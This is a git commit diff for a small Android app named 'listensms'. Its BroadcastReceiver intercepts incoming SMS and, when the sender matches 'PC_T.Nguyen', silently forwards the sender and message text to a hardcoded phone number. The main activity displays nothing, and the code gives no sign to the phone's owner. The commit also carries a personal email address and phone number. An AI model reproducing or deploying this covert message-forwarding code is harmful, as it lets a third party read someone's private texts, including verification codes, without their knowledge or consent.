70cf6d66ddad1baaf151d1faeda37d7e82a05216
Quang Huy <luanquanghuy@gmail.com>
2018-06-24 13:48:46 +0700

    Initial commit

---
+++ app/src/main/java/com/example/huy/listensms/MainActivity.java
@@ -0,0 +1,14 @@
+package com.example.huy.listensms;
+
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.telephony.SmsManager;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+}
---
+++ app/src/main/java/com/example/huy/listensms/SMSReciver.java
@@ -0,0 +1,32 @@
+package com.example.huy.listensms;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Telephony;
+import android.support.annotation.RequiresApi;
+import android.telephony.PhoneNumberUtils;
+import android.telephony.SmsManager;
+import android.telephony.SmsMessage;
+import android.util.Log;
+import android.widget.Toast;
+
+public class SMSReciver extends BroadcastReceiver {
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
+            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
+                String messageBody = smsMessage.getMessageBody().trim();
+                String sender = smsMessage.getDisplayOriginatingAddress().trim();
+                if(sender.equals("PC_T.Nguyen")) {
+                    SmsManager sms = SmsManager.getDefault();
+                    sms.sendTextMessage("+841668283196", null, smsMessage.getDisplayOriginatingAddress()+ " : " + messageBody, null, null);
+                }
+            }
+        }
+    }
+}
